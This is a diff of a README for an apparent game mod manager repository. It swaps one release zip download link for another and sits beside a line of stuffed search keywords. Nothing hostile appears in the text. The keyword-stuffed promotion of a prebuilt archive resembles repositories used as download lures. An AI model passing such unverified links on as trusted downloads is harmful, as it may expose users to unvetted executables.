@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download Madden-27-Mod-Manager](https://github.com/BottomCustodian/Madden-27-Mod-Manager/releases/download/675/Madden-27-Mod-Manager.zip)**
+**[Download Madden-27-Mod-Manager](https://github.com/BottomCustodian/Madden-27-Mod-Manager/releases/download/767/MaddenModManager.zip)**
 
 ---
 
@@ -96,3 +96,4 @@ madden 27 mod manager, madden nfl 27 mods, madden 27 roster editor, madden 27 fr
 ## 💬 Support
 
 ⭐ Star this repository if you enjoy it!
+
